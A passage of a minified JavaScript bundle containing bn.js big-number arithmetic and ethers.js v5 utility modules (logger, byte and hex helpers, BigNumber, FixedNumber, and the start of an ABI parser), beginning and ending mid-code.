ffffffffffffffff ffffffffffffffed")}i(F,C),F.prototype.imulK=function(f){for(var p=0,w=0;w<f.length;w++){var E=(f.words[w]|0)*19+p,x=E&67108863;E>>>=26,f.words[w]=x,p=E}return p!==0&&(f.words[f.length++]=p),f},s._prime=function(f){if(S[f])return S[f];var p;if(f==="k256")p=new O;else if(f==="p224")p=new $;else if(f==="p192")p=new D;else if(f==="p25519")p=new F;else throw new Error("Unknown prime "+f);return S[f]=p,p};function j(N){if(typeof N=="string"){var f=s._prime(N);this.m=f.p,this.prime=f}else n(N.gtn(1),"modulus must be greater than 1"),this.m=N,this.prime=null}j.prototype._verify1=function(f){n(f.negative===0,"red works only with positives"),n(f.red,"red works only with red numbers")},j.prototype._verify2=function(f,p){n((f.negative|p.negative)===0,"red works only with positives"),n(f.red&&f.red===p.red,"red works only with red numbers")},j.prototype.imod=function(f){return this.prime?this.prime.ireduce(f)._forceRed(this):(l(f,f.umod(this.m)._forceRed(this)),f)},j.prototype.neg=function(f){return f.isZero()?f.clone():this.m.sub(f)._forceRed(this)},j.prototype.add=function(f,p){this._verify2(f,p);var w=f.add(p);return w.cmp(this.m)>=0&&w.isub(this.m),w._forceRed(this)},j.prototype.iadd=function(f,p){this._verify2(f,p);var w=f.iadd(p);return w.cmp(this.m)>=0&&w.isub(this.m),w},j.prototype.sub=function(f,p){this._verify2(f,p);var w=f.sub(p);return w.cmpn(0)<0&&w.iadd(this.m),w._forceRed(this)},j.prototype.isub=function(f,p){this._verify2(f,p);var w=f.isub(p);return w.cmpn(0)<0&&w.iadd(this.m),w},j.prototype.shl=function(f,p){return this._verify1(f),this.imod(f.ushln(p))},j.prototype.imul=function(f,p){return this._verify2(f,p),this.imod(f.imul(p))},j.prototype.mul=function(f,p){return this._verify2(f,p),this.imod(f.mul(p))},j.prototype.isqr=function(f){return this.imul(f,f.clone())},j.prototype.sqr=function(f){return this.mul(f,f)},j.prototype.sqrt=function(f){if(f.isZero())return f.clone();var p=this.m.andln(3);if(n(p%2===1),p===3){var w=this.m.add(new s(1)).iushrn(2);return this.pow(f,w)}for(var E=this.m.subn(1),x=0;!E.isZero()&&E.andln(1)===0;)x++,E.iushrn(1);n(!E.isZero());var R=new s(1).toRed(this),B=R.redNeg(),k=this.m.subn(1).iushrn(1),v=this.m.bitLength();for(v=new s(2*v*v).toRed(this);this.pow(v,k).cmp(B)!==0;)v.redIAdd(B);for(var M=this.pow(v,E),V=this.pow(f,E.addn(1).iushrn(1)),I=this.pow(f,E),z=x;I.cmp(R)!==0;){for(var G=I,W=0;G.cmp(R)!==0;W++)G=G.redSqr();n(W<z);var K=this.pow(M,new s(1).iushln(z-W-1));V=V.redMul(K),M=K.redSqr(),I=I.redMul(M),z=W}return V},j.prototype.invm=function(f){var p=f._invmp(this.m);return p.negative!==0?(p.negative=0,this.imod(p).redNeg()):this.imod(p)},j.prototype.pow=function(f,p){if(p.isZero())return new s(1).toRed(this);if(p.cmpn(1)===0)return f.clone();var w=4,E=new Array(1<<w);E[0]=new s(1).toRed(this),E[1]=f;for(var x=2;x<E.length;x++)E[x]=this.mul(E[x-1],f);var R=E[0],B=0,k=0,v=p.bitLength()%26;for(v===0&&(v=26),x=p.length-1;x>=0;x--){for(var M=p.words[x],V=v-1;V>=0;V--){var I=M>>V&1;if(R!==E[0]&&(R=this.sqr(R)),I===0&&B===0){k=0;continue}B<<=1,B|=I,k++,!(k!==w&&(x!==0||V!==0))&&(R=this.mul(R,E[B]),k=0,B=0)}v=26}return R},j.prototype.convertTo=function(f){var p=f.umod(this.m);return p===f?p.clone():p},j.prototype.convertFrom=function(f){var p=f.clone();return p.red=null,p},s.mont=function(f){return new L(f)};function L(N){j.call(this,N),this.shift=this.m.bitLength(),this.shift%26!==0&&(this.shift+=26-this.shift%26),this.r=new s(1).iushln(this.shift),this.r2=this.imod(this.r.sqr()),this.rinv=this.r._invmp(this.m),this.minv=this.rinv.mul(this.r).isubn(1).div(this.m),this.minv=this.minv.umod(this.r),this.minv=this.r.sub(this.minv)}i(L,j),L.prototype.convertTo=function(f){return this.imod(f.ushln(this.shift))},L.prototype.convertFrom=function(f){var p=this.imod(f.mul(this.rinv));return p.red=null,p},L.prototype.imul=function(f,p){if(f.isZero()||p.isZero())return f.words[0]=0,f.length=1,f;var w=f.imul(p),E=w.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),x=w.isub(E).iushrn(this.shift),R=x;return x.cmp(this.m)>=0?R=x.isub(this.m):x.cmpn(0)<0&&(R=x.iadd(this.m)),R._forceRed(this)},L.prototype.mul=function(f,p){if(f.isZero()||p.isZero())return new s(0)._forceRed(this);var w=f.mul(p),E=w.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),x=w.isub(E).iushrn(this.shift),R=x;return x.cmp(this.m)>=0?R=x.isub(this.m):x.cmpn(0)<0&&(R=x.iadd(this.m)),R._forceRed(this)},L.prototype.invm=function(f){var p=this.imod(f._invmp(this.m).mul(this.r2));return p._forceRed(this)}})(t,ZG)}(wd)),wd.exports}var eV=XG();const Ce=co(eV),tV="logger/5.8.0";let wA=!1,bA=!1;const bd={debug:1,default:2,info:2,warning:3,error:4,off:5};let vA=bd.default,jg=null;function rV(){try{const t=[];if(["NFD","NFC","NFKD","NFKC"].forEach(e=>{try{if("test".normalize(e)!=="test")throw new Error("bad normalize")}catch{t.push(e)}}),t.length)throw new Error("missing "+t.join(", "));if("".normalize("NFD")!=="e")throw new Error("broken implementation")}catch(t){return t.message}return null}const EA=rV();var M0;(function(t){t.DEBUG="DEBUG",t.INFO="INFO",t.WARNING="WARNING",t.ERROR="ERROR",t.OFF="OFF"})(M0||(M0={}));var oi;(function(t){t.UNKNOWN_ERROR="UNKNOWN_ERROR",t.NOT_IMPLEMENTED="NOT_IMPLEMENTED",t.UNSUPPORTED_OPERATION="UNSUPPORTED_OPERATION",t.NETWORK_ERROR="NETWORK_ERROR",t.SERVER_ERROR="SERVER_ERROR",t.TIMEOUT="TIMEOUT",t.BUFFER_OVERRUN="BUFFER_OVERRUN",t.NUMERIC_FAULT="NUMERIC_FAULT",t.MISSING_NEW="MISSING_NEW",t.INVALID_ARGUMENT="INVALID_ARGUMENT",t.MISSING_ARGUMENT="MISSING_ARGUMENT",t.UNEXPECTED_ARGUMENT="UNEXPECTED_ARGUMENT",t.CALL_EXCEPTION="CALL_EXCEPTION",t.INSUFFICIENT_FUNDS="INSUFFICIENT_FUNDS",t.NONCE_EXPIRED="NONCE_EXPIRED",t.REPLACEMENT_UNDERPRICED="REPLACEMENT_UNDERPRICED",t.UNPREDICTABLE_GAS_LIMIT="UNPREDICTABLE_GAS_LIMIT",t.TRANSACTION_REPLACED="TRANSACTION_REPLACED",t.ACTION_REJECTED="ACTION_REJECTED"})(oi||(oi={}));const AA="0123456789abcdef";class H{constructor(e){Object.defineProperty(this,"version",{enumerable:!0,value:e,writable:!1})}_log(e,r){const n=e.toLowerCase();bd[n]==null&&this.throwArgumentError("invalid log level name","logLevel",e),!(vA>bd[n])&&console.log.apply(console,r)}debug(...e){this._log(H.levels.DEBUG,e)}info(...e){this._log(H.levels.INFO,e)}warn(...e){this._log(H.levels.WARNING,e)}makeError(e,r,n){if(bA)return this.makeError("censored error",r,{});r||(r=H.errors.UNKNOWN_ERROR),n||(n={});const i=[];Object.keys(n).forEach(c=>{const u=n[c];try{if(u instanceof Uint8Array){let l="";for(let h=0;h<u.length;h++)l+=AA[u[h]>>4],l+=AA[u[h]&15];i.push(c+"=Uint8Array(0x"+l+")")}else i.push(c+"="+JSON.stringify(u))}catch{i.push(c+"="+JSON.stringify(n[c].toString()))}}),i.push(`code=${r}`),i.push(`version=${this.version}`);const s=e;let o="";switch(r){case oi.NUMERIC_FAULT:{o="NUMERIC_FAULT";const c=e;switch(c){case"overflow":case"underflow":case"division-by-zero":o+="-"+c;break;case"negative-power":case"negative-width":o+="-unsupported";break;case"unbound-bitwise-result":o+="-unbound-result";break}break}case oi.CALL_EXCEPTION:case oi.INSUFFICIENT_FUNDS:case oi.MISSING_NEW:case oi.NONCE_EXPIRED:case oi.REPLACEMENT_UNDERPRICED:case oi.TRANSACTION_REPLACED:case oi.UNPREDICTABLE_GAS_LIMIT:o=r;break}o&&(e+=" [ See: https://links.ethers.org/v5-errors-"+o+" ]"),i.length&&(e+=" ("+i.join(", ")+")");const a=new Error(e);return a.reason=s,a.code=r,Object.keys(n).forEach(function(c){a[c]=n[c]}),a}throwError(e,r,n){throw this.makeError(e,r,n)}throwArgumentError(e,r,n){return this.throwError(e,H.errors.INVALID_ARGUMENT,{argument:r,value:n})}assert(e,r,n,i){e||this.throwError(r,n,i)}assertArgument(e,r,n,i){e||this.throwArgumentError(r,n,i)}checkNormalize(e){EA&&this.throwError("platform missing String.prototype.normalize",H.errors.UNSUPPORTED_OPERATION,{operation:"String.prototype.normalize",form:EA})}checkSafeUint53(e,r){typeof e=="number"&&(r==null&&(r="value not safe"),(e<0||e>=9007199254740991)&&this.throwError(r,H.errors.NUMERIC_FAULT,{operation:"checkSafeInteger",fault:"out-of-safe-range",value:e}),e%1&&this.throwError(r,H.errors.NUMERIC_FAULT,{operation:"checkSafeInteger",fault:"non-integer",value:e}))}checkArgumentCount(e,r,n){n?n=": "+n:n="",e<r&&this.throwError("missing argument"+n,H.errors.MISSING_ARGUMENT,{count:e,expectedCount:r}),e>r&&this.throwError("too many arguments"+n,H.errors.UNEXPECTED_ARGUMENT,{count:e,expectedCount:r})}checkNew(e,r){(e===Object||e==null)&&this.throwError("missing new",H.errors.MISSING_NEW,{name:r.name})}checkAbstract(e,r){e===r?this.throwError("cannot instantiate abstract class "+JSON.stringify(r.name)+" directly; use a sub-class",H.errors.UNSUPPORTED_OPERATION,{name:e.name,operation:"new"}):(e===Object||e==null)&&this.throwError("missing new",H.errors.MISSING_NEW,{name:r.name})}static globalLogger(){return jg||(jg=new H(tV)),jg}static setCensorship(e,r){if(!e&&r&&this.globalLogger().throwError("cannot permanently disable censorship",H.errors.UNSUPPORTED_OPERATION,{operation:"setCensorship"}),wA){if(!e)return;this.globalLogger().throwError("error censorship permanent",H.errors.UNSUPPORTED_OPERATION,{operation:"setCensorship"})}bA=!!e,wA=!!r}static setLogLevel(e){const r=bd[e.toLowerCase()];if(r==null){H.globalLogger().warn("invalid log level - "+e);return}vA=r}static from(e){return new H(e)}}H.errors=oi;H.levels=M0;const nV="bytes/5.8.0",Xt=new H(nV);function hx(t){return!!t.toHexString}function lc(t){return t.slice||(t.slice=function(){const e=Array.prototype.slice.call(arguments);return lc(new Uint8Array(Array.prototype.slice.apply(t,e)))}),t}function Gy(t){return Ye(t)&&!(t.length%2)||Gc(t)}function _A(t){return typeof t=="number"&&t==t&&t%1===0}function Gc(t){if(t==null)return!1;if(t.constructor===Uint8Array)return!0;if(typeof t=="string"||!_A(t.length)||t.length<0)return!1;for(let e=0;e<t.length;e++){const r=t[e];if(!_A(r)||r<0||r>=256)return!1}return!0}function ve(t,e){if(e||(e={}),typeof t=="number"){Xt.checkSafeUint53(t,"invalid arrayify value");const r=[];for(;t;)r.unshift(t&255),t=parseInt(String(t/256));return r.length===0&&r.push(0),lc(new Uint8Array(r))}if(e.allowMissingPrefix&&typeof t=="string"&&t.substring(0,2)!=="0x"&&(t="0x"+t),hx(t)&&(t=t.toHexString()),Ye(t)){let r=t.substring(2);r.length%2&&(e.hexPad==="left"?r="0"+r:e.hexPad==="right"?r+="0":Xt.throwArgumentError("hex data is odd-length","value",t));const n=[];for(let i=0;i<r.length;i+=2)n.push(parseInt(r.substring(i,i+2),16));return lc(new Uint8Array(n))}return Gc(t)?lc(new Uint8Array(t)):Xt.throwArgumentError("invalid arrayify value","value",t)}function Pn(t){const e=t.map(i=>ve(i)),r=e.reduce((i,s)=>i+s.length,0),n=new Uint8Array(r);return e.reduce((i,s)=>(n.set(s,i),i+s.length),0),lc(n)}function Rc(t){let e=ve(t);if(e.length===0)return e;let r=0;for(;r<e.length&&e[r]===0;)r++;return r&&(e=e.slice(r)),e}function iV(t,e){t=ve(t),t.length>e&&Xt.throwArgumentError("value out of range","value",arguments[0]);const r=new Uint8Array(e);return r.set(t,e-t.length),lc(r)}function Ye(t,e){return!(typeof t!="string"||!t.match(/^0x[0-9A-Fa-f]*$/)||e&&t.length!==2+2*e)}const qg="0123456789abcdef";function we(t,e){if(e||(e={}),typeof t=="number"){Xt.checkSafeUint53(t,"invalid hexlify value");let r="";for(;t;)r=qg[t&15]+r,t=Math.floor(t/16);return r.length?(r.length%2&&(r="0"+r),"0x"+r):"0x00"}if(typeof t=="bigint")return t=t.toString(16),t.length%2?"0x0"+t:"0x"+t;if(e.allowMissingPrefix&&typeof t=="string"&&t.substring(0,2)!=="0x"&&(t="0x"+t),hx(t))return t.toHexString();if(Ye(t))return t.length%2&&(e.hexPad==="left"?t="0x0"+t.substring(2):e.hexPad==="right"?t+="0":Xt.throwArgumentError("hex data is odd-length","value",t)),t.toLowerCase();if(Gc(t)){let r="0x";for(let n=0;n<t.length;n++){let i=t[n];r+=qg[(i&240)>>4]+qg[i&15]}return r}return Xt.throwArgumentError("invalid hexlify value","value",t)}function fa(t){if(typeof t!="string")t=we(t);else if(!Ye(t)||t.length%2)return null;return(t.length-2)/2}function qr(t,e,r){return typeof t!="string"?t=we(t):(!Ye(t)||t.length%2)&&Xt.throwArgumentError("invalid hexData","value",t),e=2+2*e,r!=null?"0x"+t.substring(e,2+2*r):"0x"+t.substring(e)}function dn(t){let e="0x";return t.forEach(r=>{e+=we(r).substring(2)}),e}function Vy(t){const e=sV(we(t,{hexPad:"left"}));return e==="0x"?"0x0":e}function sV(t){typeof t!="string"&&(t=we(t)),Ye(t)||Xt.throwArgumentError("invalid hex string","value",t),t=t.substring(2);let e=0;for(;e<t.length&&t[e]==="0";)e++;return"0x"+t.substring(e)}function Vt(t,e){for(typeof t!="string"?t=we(t):Ye(t)||Xt.throwArgumentError("invalid hex string","value",t),t.length>2*e+2&&Xt.throwArgumentError("value out of range","value",arguments[1]);t.length<2*e+2;)t="0x0"+t.substring(2);return t}function ep(t){const e={r:"0x",s:"0x",_vs:"0x",recoveryParam:0,v:0,yParityAndS:"0x",compact:"0x"};if(Gy(t)){let r=ve(t);r.length===64?(e.v=27+(r[32]>>7),r[32]&=127,e.r=we(r.slice(0,32)),e.s=we(r.slice(32,64))):r.length===65?(e.r=we(r.slice(0,32)),e.s=we(r.slice(32,64)),e.v=r[64]):Xt.throwArgumentError("invalid signature string","signature",t),e.v<27&&(e.v===0||e.v===1?e.v+=27:Xt.throwArgumentError("signature invalid v byte","signature",t)),e.recoveryParam=1-e.v%2,e.recoveryParam&&(r[32]|=128),e._vs=we(r.slice(32,64))}else{if(e.r=t.r,e.s=t.s,e.v=t.v,e.recoveryParam=t.recoveryParam,e._vs=t._vs,e._vs!=null){const i=iV(ve(e._vs),32);e._vs=we(i);const s=i[0]>=128?1:0;e.recoveryParam==null?e.recoveryParam=s:e.recoveryParam!==s&&Xt.throwArgumentError("signature recoveryParam mismatch _vs","signature",t),i[0]&=127;const o=we(i);e.s==null?e.s=o:e.s!==o&&Xt.throwArgumentError("signature v mismatch _vs","signature",t)}if(e.recoveryParam==null)e.v==null?Xt.throwArgumentError("signature missing v and recoveryParam","signature",t):e.v===0||e.v===1?e.recoveryParam=e.v:e.recoveryParam=1-e.v%2;else if(e.v==null)e.v=27+e.recoveryParam;else{const i=e.v===0||e.v===1?e.v:1-e.v%2;e.recoveryParam!==i&&Xt.throwArgumentError("signature recoveryParam mismatch v","signature",t)}e.r==null||!Ye(e.r)?Xt.throwArgumentError("signature missing or invalid r","signature",t):e.r=Vt(e.r,32),e.s==null||!Ye(e.s)?Xt.throwArgumentError("signature missing or invalid s","signature",t):e.s=Vt(e.s,32);const r=ve(e.s);r[0]>=128&&Xt.throwArgumentError("signature s out of range","signature",t),e.recoveryParam&&(r[0]|=128);const n=we(r);e._vs&&(Ye(e._vs)||Xt.throwArgumentError("signature invalid _vs","signature",t),e._vs=Vt(e._vs,32)),e._vs==null?e._vs=n:e._vs!==n&&Xt.throwArgumentError("signature _vs mismatch v and s","signature",t)}return e.yParityAndS=e._vs,e.compact=e.r+e.yParityAndS.substring(2),e}const dx="bignumber/5.8.0";var lf=Ce.BN;const os=new H(dx),zg={},oV=9007199254740991;function aV(t){return t!=null&&(ne.isBigNumber(t)||typeof t=="number"&&t%1===0||typeof t=="string"&&!!t.match(/^-?[0-9]+$/)||Ye(t)||typeof t=="bigint"||Gc(t))}let CA=!1;class ne{constructor(e,r){e!==zg&&os.throwError("cannot call constructor directly; use BigNumber.from",H.errors.UNSUPPORTED_OPERATION,{operation:"new (BigNumber)"}),this._hex=r,this._isBigNumber=!0,Object.freeze(this)}fromTwos(e){return an($e(this).fromTwos(e))}toTwos(e){return an($e(this).toTwos(e))}abs(){return this._hex[0]==="-"?ne.from(this._hex.substring(1)):this}add(e){return an($e(this).add($e(e)))}sub(e){return an($e(this).sub($e(e)))}div(e){return ne.from(e).isZero()&&Ln("division-by-zero","div"),an($e(this).div($e(e)))}mul(e){return an($e(this).mul($e(e)))}mod(e){const r=$e(e);return r.isNeg()&&Ln("division-by-zero","mod"),an($e(this).umod(r))}pow(e){const r=$e(e);return r.isNeg()&&Ln("negative-power","pow"),an($e(this).pow(r))}and(e){const r=$e(e);return(this.isNegative()||r.isNeg())&&Ln("unbound-bitwise-result","and"),an($e(this).and(r))}or(e){const r=$e(e);return(this.isNegative()||r.isNeg())&&Ln("unbound-bitwise-result","or"),an($e(this).or(r))}xor(e){const r=$e(e);return(this.isNegative()||r.isNeg())&&Ln("unbound-bitwise-result","xor"),an($e(this).xor(r))}mask(e){return(this.isNegative()||e<0)&&Ln("negative-width","mask"),an($e(this).maskn(e))}shl(e){return(this.isNegative()||e<0)&&Ln("negative-width","shl"),an($e(this).shln(e))}shr(e){return(this.isNegative()||e<0)&&Ln("negative-width","shr"),an($e(this).shrn(e))}eq(e){return $e(this).eq($e(e))}lt(e){return $e(this).lt($e(e))}lte(e){return $e(this).lte($e(e))}gt(e){return $e(this).gt($e(e))}gte(e){return $e(this).gte($e(e))}isNegative(){return this._hex[0]==="-"}isZero(){return $e(this).isZero()}toNumber(){try{return $e(this).toNumber()}catch{Ln("overflow","toNumber",this.toString())}return null}toBigInt(){try{return BigInt(this.toString())}catch{}return os.throwError("this platform does not support BigInt",H.errors.UNSUPPORTED_OPERATION,{value:this.toString()})}toString(){return arguments.length>0&&(arguments[0]===10?CA||(CA=!0,os.warn("BigNumber.toString does not accept any parameters; base-10 is assumed")):arguments[0]===16?os.throwError("BigNumber.toString does not accept any parameters; use bigNumber.toHexString()",H.errors.UNEXPECTED_ARGUMENT,{}):os.throwError("BigNumber.toString does not accept parameters",H.errors.UNEXPECTED_ARGUMENT,{})),$e(this).toString(10)}toHexString(){return this._hex}toJSON(e){return{type:"BigNumber",hex:this.toHexString()}}static from(e){if(e instanceof ne)return e;if(typeof e=="string")return e.match(/^-?0x[0-9a-f]+$/i)?new ne(zg,$l(e)):e.match(/^-?[0-9]+$/)?new ne(zg,$l(new lf(e))):os.throwArgumentError("invalid BigNumber string","value",e);if(typeof e=="number")return e%1&&Ln("underflow","BigNumber.from",e),(e>=oV||e<=-9007199254740991)&&Ln("overflow","BigNumber.from",e),ne.from(String(e));const r=e;if(typeof r=="bigint")return ne.from(r.toString());if(Gc(r))return ne.from(we(r));if(r)if(r.toHexString){const n=r.toHexString();if(typeof n=="string")return ne.from(n)}else{let n=r._hex;if(n==null&&r.type==="BigNumber"&&(n=r.hex),typeof n=="string"&&(Ye(n)||n[0]==="-"&&Ye(n.substring(1))))return ne.from(n)}return os.throwArgumentError("invalid BigNumber value","value",e)}static isBigNumber(e){return!!(e&&e._isBigNumber)}}function $l(t){if(typeof t!="string")return $l(t.toString(16));if(t[0]==="-")return t=t.substring(1),t[0]==="-"&&os.throwArgumentError("invalid hex","value",t),t=$l(t),t==="0x00"?t:"-"+t;if(t.substring(0,2)!=="0x"&&(t="0x"+t),t==="0x")return"0x00";for(t.length%2&&(t="0x0"+t.substring(2));t.length>4&&t.substring(0,4)==="0x00";)t="0x"+t.substring(4);return t}function an(t){return ne.from($l(t))}function $e(t){const e=ne.from(t).toHexString();return e[0]==="-"?new lf("-"+e.substring(3),16):new lf(e.substring(2),16)}function Ln(t,e,r){const n={fault:t,operation:e};return r!=null&&(n.value=r),os.throwError(t,H.errors.NUMERIC_FAULT,n)}function cV(t){return new lf(t,36).toString(16)}const Yr=new H(dx),Uu={},fx=ne.from(0),px=ne.from(-1);function gx(t,e,r,n){const i={fault:e,operation:r};return n!==void 0&&(i.value=n),Yr.throwError(t,H.errors.NUMERIC_FAULT,i)}let $u="0";for(;$u.length<256;)$u+=$u;function Ky(t){if(typeof t!="number")try{t=ne.from(t).toNumber()}catch{}return typeof t=="number"&&t>=0&&t<=256&&!(t%1)?"1"+$u.substring(0,t):Yr.throwArgumentError("invalid decimal size","decimals",t)}function Hg(t,e){e==null&&(e=0);const r=Ky(e);t=ne.from(t);const n=t.lt(fx);n&&(t=t.mul(px));let i=t.mod(r).toString();for(;i.length<r.length-1;)i="0"+i;i=i.match(/^([0-9]*[1-9]|0)(0*)/)[1];const s=t.div(r).toString();return r.length===1?t=s:t=s+"."+i,n&&(t="-"+t),t}function Si(t,e){e==null&&(e=0);const r=Ky(e);(typeof t!="string"||!t.match(/^-?[0-9.]+$/))&&Yr.throwArgumentError("invalid decimal value","value",t);const n=t.substring(0,1)==="-";n&&(t=t.substring(1)),t==="."&&Yr.throwArgumentError("missing value","value",t);const i=t.split(".");i.length>2&&Yr.throwArgumentError("too many decimal points","value",t);let s=i[0],o=i[1];for(s||(s="0"),o||(o="0");o[o.length-1]==="0";)o=o.substring(0,o.length-1);for(o.length>r.length-1&&gx("fractional component exceeds decimals","underflow","parseFixed"),o===""&&(o="0");o.length<r.length-1;)o+="0";const a=ne.from(s),c=ne.from(o);let u=a.mul(r).add(c);return n&&(u=u.mul(px)),u}class hc{constructor(e,r,n,i){e!==Uu&&Yr.throwError("cannot use FixedFormat constructor; use FixedFormat.from",H.errors.UNSUPPORTED_OPERATION,{operation:"new FixedFormat"}),this.signed=r,this.width=n,this.decimals=i,this.name=(r?"":"u")+"fixed"+String(n)+"x"+String(i),this._multiplier=Ky(i),Object.freeze(this)}static from(e){if(e instanceof hc)return e;typeof e=="number"&&(e=`fixed128x${e}`);let r=!0,n=128,i=18;if(typeof e=="string"){if(e!=="fixed")if(e==="ufixed")r=!1;else{const s=e.match(/^(u?)fixed([0-9]+)x([0-9]+)$/);s||Yr.throwArgumentError("invalid fixed format","format",e),r=s[1]!=="u",n=parseInt(s[2]),i=parseInt(s[3])}}else if(e){const s=(o,a,c)=>e[o]==null?c:(typeof e[o]!==a&&Yr.throwArgumentError("invalid fixed format ("+o+" not "+a+")","format."+o,e[o]),e[o]);r=s("signed","boolean",r),n=s("width","number",n),i=s("decimals","number",i)}return n%8&&Yr.throwArgumentError("invalid fixed format width (not byte aligned)","format.width",n),i>80&&Yr.throwArgumentError("invalid fixed format (decimals too large)","format.decimals",i),new hc(Uu,r,n,i)}}class Rr{constructor(e,r,n,i){e!==Uu&&Yr.throwError("cannot use FixedNumber constructor; use FixedNumber.from",H.errors.UNSUPPORTED_OPERATION,{operation:"new FixedFormat"}),this.format=i,this._hex=r,this._value=n,this._isFixedNumber=!0,Object.freeze(this)}_checkFormat(e){this.format.name!==e.format.name&&Yr.throwArgumentError("incompatible format; use fixedNumber.toFormat","other",e)}addUnsafe(e){this._checkFormat(e);const r=Si(this._value,this.format.decimals),n=Si(e._value,e.format.decimals);return Rr.fromValue(r.add(n),this.format.decimals,this.format)}subUnsafe(e){this._checkFormat(e);const r=Si(this._value,this.format.decimals),n=Si(e._value,e.format.decimals);return Rr.fromValue(r.sub(n),this.format.decimals,this.format)}mulUnsafe(e){this._checkFormat(e);const r=Si(this._value,this.format.decimals),n=Si(e._value,e.format.decimals);return Rr.fromValue(r.mul(n).div(this.format._multiplier),this.format.decimals,this.format)}divUnsafe(e){this._checkFormat(e);const r=Si(this._value,this.format.decimals),n=Si(e._value,e.format.decimals);return Rr.fromValue(r.mul(this.format._multiplier).div(n),this.format.decimals,this.format)}floor(){const e=this.toString().split(".");e.length===1&&e.push("0");let r=Rr.from(e[0],this.format);const n=!e[1].match(/^(0*)$/);return this.isNegative()&&n&&(r=r.subUnsafe(IA.toFormat(r.format))),r}ceiling(){const e=this.toString().split(".");e.length===1&&e.push("0");let r=Rr.from(e[0],this.format);const n=!e[1].match(/^(0*)$/);return!this.isNegative()&&n&&(r=r.addUnsafe(IA.toFormat(r.format))),r}round(e){e==null&&(e=0);const r=this.toString().split(".");if(r.length===1&&r.push("0"),(e<0||e>80||e%1)&&Yr.throwArgumentError("invalid decimal count","decimals",e),r[1].length<=e)return this;const n=Rr.from("1"+$u.substring(0,e),this.format),i=uV.toFormat(this.format);return this.mulUnsafe(n).addUnsafe(i).floor().divUnsafe(n)}isZero(){return this._value==="0.0"||this._value==="0"}isNegative(){return this._value[0]==="-"}toString(){return this._value}toHexString(e){if(e==null)return this._hex;e%8&&Yr.throwArgumentError("invalid byte width","width",e);const r=ne.from(this._hex).fromTwos(this.format.width).toTwos(e).toHexString();return Vt(r,e/8)}toUnsafeFloat(){return parseFloat(this.toString())}toFormat(e){return Rr.fromString(this._value,e)}static fromValue(e,r,n){return n==null&&r!=null&&!aV(r)&&(n=r,r=null),r==null&&(r=0),n==null&&(n="fixed"),Rr.fromString(Hg(e,r),hc.from(n))}static fromString(e,r){r==null&&(r="fixed");const n=hc.from(r),i=Si(e,n.decimals);!n.signed&&i.lt(fx)&&gx("unsigned value cannot be negative","overflow","value",e);let s=null;n.signed?s=i.toTwos(n.width).toHexString():(s=i.toHexString(),s=Vt(s,n.width/8));const o=Hg(i,n.decimals);return new Rr(Uu,s,o,n)}static fromBytes(e,r){r==null&&(r="fixed");const n=hc.from(r);if(ve(e).length>n.width/8)throw new Error("overflow");let i=ne.from(e);n.signed&&(i=i.fromTwos(n.width));const s=i.toTwos((n.signed?0:1)+n.width).toHexString(),o=Hg(i,n.decimals);return new Rr(Uu,s,o,n)}static from(e,r){if(typeof e=="string")return Rr.fromString(e,r);if(Gc(e))return Rr.fromBytes(e,r);try{return Rr.fromValue(e,0,r)}catch(n){if(n.code!==H.errors.INVALID_ARGUMENT)throw n}return Yr.throwArgumentError("invalid FixedNumber value","value",e)}static isFixedNumber(e){return!!(e&&e._isFixedNumber)}}const IA=Rr.from(1),uV=Rr.from("0.5"),lV="properties/5.8.0";var hV=function(t,e,r,n){function i(s){return s instanceof r?s:new r(function(o){o(s)})}return new(r||(r=Promise))(function(s,o){function a(l){try{u(n.next(l))}catch(h){o(h)}}function c(l){try{u(n.throw(l))}catch(h){o(h)}}function u(l){l.done?s(l.value):i(l.value).then(a,c)}u((n=n.apply(t,e||[])).next())})};const hf=new H(lV);function X(t,e,r){Object.defineProperty(t,e,{enumerable:!0,value:r,writable:!1})}function Bi(t,e){for(let r=0;r<32;r++){if(t[e])return t[e];if(!t.prototype||typeof t.prototype!="object")break;t=Object.getPrototypeOf(t.prototype).constructor}return null}function sr(t){return hV(this,void 0,void 0,function*(){const e=Object.keys(t).map(n=>{const i=t[n];return Promise.resolve(i).then(s=>({key:n,value:s}))});return(yield Promise.all(e)).reduce((n,i)=>(n[i.key]=i.value,n),{})})}function dV(t,e){(!t||typeof t!="object")&&hf.throwArgumentError("invalid object","object",t),Object.keys(t).forEach(r=>{e[r]||hf.throwArgumentError("invalid object key - "+r,"transaction:"+r,t)})}function pr(t){const e={};for(const r in t)e[r]=t[r];return e}const fV={bigint:!0,boolean:!0,function:!0,number:!0,string:!0};function mx(t){if(t==null||fV[typeof t])return!0;if(Array.isArray(t)||typeof t=="object"){if(!Object.isFrozen(t))return!1;const e=Object.keys(t);for(let r=0;r<e.length;r++){let n=null;try{n=t[e[r]]}catch{continue}if(!mx(n))return!1}return!0}return hf.throwArgumentError(`Cannot deepCopy ${typeof t}`,"object",t)}function pV(t){if(mx(t))return t;if(Array.isArray(t))return Object.freeze(t.map(e=>Es(e)));if(typeof t=="object"){const e={};for(const r in t){const n=t[r];n!==void 0&&X(e,r,Es(n))}return e}return hf.throwArgumentError(`Cannot deepCopy ${typeof t}`,"object",t)}function Es(t){return pV(t)}class mh{constructor(e){for(const r in e)this[r]=Es(e[r])}}const yh="abi/5.8.0",je=new H(yh),pa={};let xA={calldata:!0,memory:!0,storage:!0},gV={calldata:!0,memory:!0};function Jh(t,e){if(t==="bytes"||t==="string"){if(xA[e])return!0}else if(t==="address"){if(e==="payable")return!0}else if((t.indexOf("[")>=0||t==="tuple")&&gV[e])return!0;return(xA[e]||e==="payable")&&je.throwArgumentError("invalid modifier","name",e),!1}function mV(t,e){let r=t;function n(a){je.throwArgumentError(`unexpected character at position ${a}`,"param",t)}t=t.replace(/\s/g," ");function i(a){let c={type:"",name:"",parent:a,state:{allowType:!0}};return e&&(c.indexed=!1),c}let s={type:"",name:"",state:{allowType:!0}},o=s;for(let a=0;a<t.length;a++){let c=t[a];switch(c){case"(":o.state.allowType&&o.type===""?o.type="tuple":o.state.allowParams||n(a),o.state.allowType=!1,o.type=Za(o.type),o.components=[i(o)],o=o.components[0];break;case")":delete o.state,o.name==="indexed"&&(e||n(a),o.indexed=!0,o.name=""),Jh(o.type,o.name)&&(o.name=""),o.type=Za(o.type);let u=o;o=o.parent,o||n(a),delete u.parent,o.state.allowParams=!1,o.state.allowName=!0,o.state.allowArray=!0;break;case",":delete o.state,o.name==="indexed"&&(e||n(a),o.indexed=!0,o.name=""),Jh(o.type,o.name)&&(o.name=""),o.type=Za(o.type);let 